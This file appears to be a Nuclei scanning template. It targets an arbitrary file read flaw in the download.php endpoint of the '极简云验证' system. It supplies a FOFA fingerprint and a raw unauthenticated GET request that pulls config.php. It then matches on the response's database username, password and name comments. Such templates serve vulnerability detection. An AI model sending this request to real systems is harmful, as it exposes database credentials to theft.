id: jijianyun-download_php-File-reading

info:
  name: "极简云验证 download.php 接口存在任意文件读取漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: "../assets/img/bg/logo_white.png"
      极简云验证系统 download.php 接口存在文件读取逻辑缺陷，攻击者可通过该接口绕过身份验证机制，实现对系统内部配置文件、数据库凭证等敏感数据的非授权访问，导致系统安全防护体系失效。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488181&idx=1&sn=3bb53898511573714dc7a0ec8208c649&chksm=c267a786f5102e901c3ca974ff99c0d9b27b94fe5f33ee3eb07dfacc5c9b201dfd76730ecce2&token=350950895&lang=zh_CN#rd
  tags: 极简云验证



http:
- raw:
  - |
    GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '//数据库用户名'
    - '//数据库密码'
    - '//数据库名'
    condition: and
  - type: status
    status:
    - 200





